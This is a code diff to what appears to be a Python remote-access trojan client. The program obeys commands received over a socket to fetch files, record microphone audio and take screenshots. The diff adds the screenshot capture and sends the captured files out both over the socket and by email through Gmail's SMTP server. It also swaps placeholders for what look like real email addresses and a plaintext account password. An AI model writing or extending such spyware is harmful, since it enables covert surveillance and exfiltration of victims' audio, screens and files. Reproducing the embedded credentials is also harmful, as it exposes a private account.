@@ -8,6 +8,7 @@ from email.mime.base import MIMEBase
 from email import encoders
 import pyaudio
 import wave
+from PIL import ImageGrab
 import time
 
 # socket variables
@@ -20,7 +21,7 @@ def file_size(path):
 
 
 def get_file(data):
-    data = data[9: -1] + data[-1]
+    # data = data[9: -1] + data[-1]
     f = open(data, 'rb')
     while True:
         content = f.read(1024)
@@ -29,6 +30,12 @@ def get_file(data):
         else:
             f.close()
             break
+
+
+def take_screenshot(data):
+    snapshot = ImageGrab.grab()
+    save_path = data
+    snapshot.save(save_path)
 
 
 def download_file(data):
@@ -71,8 +78,8 @@ def take_record(record_time, file_to_save):
 
 
 def send_email(file_name):
-    fromaddr = "Sender"
-    toaddr = "Reciver"
+    fromaddr = "yehonatanavi21@gmail.com"
+    toaddr = "avitantan@gmail.com"
 
     # instance of MIMEMultipart
     msg = MIMEMultipart()
@@ -117,7 +124,7 @@ def send_email(file_name):
     s.starttls()
 
     # Authentication
-    s.login(fromaddr, "your password")
+    s.login(fromaddr, "yehonatan123")
 
     # Converts the Multipart msg into a string
     text = msg.as_string()
@@ -139,6 +146,7 @@ def client():
                 s.send(f"Error with {data} command".encode('utf-8'))
 
         elif data.startswith('get file '):
+            data = data[9: -1] + data[-1]
             get_file(data)
 
 
@@ -153,11 +161,17 @@ def client():
 
         elif data.startswith('take record '):
             data = s.recv(1024).decode('utf-8')
-            data_2 = s.recv(1024).decode('utf-8')
-            take_record(int(data), data_2)
-            send_email(data_2)
+            location_of_file = s.recv(1024).decode('utf-8')
+            take_record(int(data), location_of_file)
+            send_email(location_of_file)
+            get_file(location_of_file)
 
-
+        elif data.startswith('take screenshot '):
+            data = data[16:-1] + data[-1]
+            take_screenshot(data)
+            send_email(data)
+            s.sendall('You got the screenshot in the mail'.encode('utf-8'))
+            get_file(data)
 
 
 
